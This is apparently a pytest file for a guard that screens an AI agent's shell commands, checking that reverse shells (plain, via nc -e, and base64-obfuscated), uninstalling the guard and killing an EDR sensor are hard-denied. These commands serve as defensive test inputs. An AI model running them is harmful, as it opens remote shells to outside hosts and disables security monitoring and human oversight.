"""Block-obvious-evil: the hard_deny tier blocks never-legitimate actions out of
the box — even in observe mode, where everything else only detects."""
from __future__ import annotations

import base64
from datetime import UTC, datetime

from ccguard.agent.enforce import _decide_bash, decide
from ccguard.schemas import CommandsPolicy, Policy, PolicyMeta
from ccguard.schemas.enforce import EnforceHookInput


def _observe() -> Policy:
    return Policy(meta=PolicyMeta(revision=1, updated_at=datetime.now(UTC)), enforcement_mode="observe")


def _bash(cmd: str) -> EnforceHookInput:
    return EnforceHookInput(hook_event_name="PreToolUse", tool_name="Bash", tool_input={"command": cmd})


def test_reverse_shell_hard_blocked_even_in_observe():
    d = decide(_bash("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), _observe())
    assert d.permission == "deny"
    assert d.rule_id == "hard.reverse_shell"
    assert d.hard_deny is True


def test_nc_e_reverse_shell_hard_blocked():
    d = _decide_bash("nc -e /bin/sh 10.0.0.1 4444", _observe())
    assert d.permission == "deny" and d.hard_deny


def test_disable_ccguard_hard_blocked_in_observe():
    d = decide(_bash("ccguard uninstall && rm -rf ~/.ccguard"), _observe())
    assert d.permission == "deny"
    assert d.rule_id == "hard.disable_security"


def test_kill_edr_sensor_hard_blocked():
    d = _decide_bash("pkill -9 falcon-sensor", _observe())
    assert d.permission == "deny" and d.rule_id == "hard.disable_security"


def test_obfuscated_reverse_shell_hard_blocked():
    payload = base64.b64encode(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").decode()
    d = decide(_bash(f"echo {payload} | base64 -d | bash"), _observe())
    assert d.permission == "deny"  # de-obfuscated → reverse shell surfaces


def test_benign_interactive_bash_not_hard_blocked():
    d = _decide_bash("bash -i", _observe())  # interactive shell, no socket redirect
    assert not d.hard_deny


def test_benign_nc_port_check_not_blocked():
    d = _decide_bash("nc -z github.com 443", _observe())  # port check, no -e
    assert d.permission == "allow"


def test_non_hard_deny_still_flips_in_observe():
    # a normal (non-hard) deny must STILL flip to allow in observe mode
    pol = Policy(
        meta=PolicyMeta(revision=1, updated_at=datetime.now(UTC)),
        enforcement_mode="observe",
        commands=CommandsPolicy(denylist_patterns=["super-secret-marker"]),
    )
    d = decide(_bash("run super-secret-marker now"), pol)
    assert d.permission == "allow"  # observe override, NOT hard


def test_hard_deny_also_blocks_in_enforce_mode():
    pol = Policy(meta=PolicyMeta(revision=1, updated_at=datetime.now(UTC)), enforcement_mode="enforce")
    d = decide(_bash("nc -e /bin/bash 10.0.0.1 9001"), pol)
    assert d.permission == "deny" and d.hard_deny
